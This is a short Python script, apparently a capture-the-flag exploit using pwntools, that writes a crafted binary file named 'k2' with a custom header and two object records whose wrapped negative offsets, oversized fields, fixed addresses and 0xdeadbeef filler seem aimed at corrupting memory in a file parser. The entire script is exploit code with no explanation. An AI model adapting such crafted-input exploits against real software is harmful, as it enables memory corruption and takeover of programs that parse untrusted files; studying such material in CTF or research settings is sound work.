from pwn import *

def dum(size):
  return p32(0x4D464D48) + p32(size)
dat = p32(0x2) # number of obj

# obj1
dat += p32(0x1) # obj type
dat += p32(0x64) # X
dat += p32(0x64) # Y
dat += p32(-0xcc&0xffffffff) # offset
dat += p32(0xcc) # size
dat += p64(0x8) # XORKEY

# obj2
dat += p32(0x1) # obj type
dat += p32(0x40666C) # X
dat += p32(0x40666C) # X
dat += p32((0x0406498)&0xffffffff) # offset
dat += p32((-0x00406498)&0xffffffff) # offset
#dat += p32(40) # size
dat += p64(0xdeadbeef)*40

f = open("k2","w")
f.write(dum(len(dat)+8)+dat)
f.close()
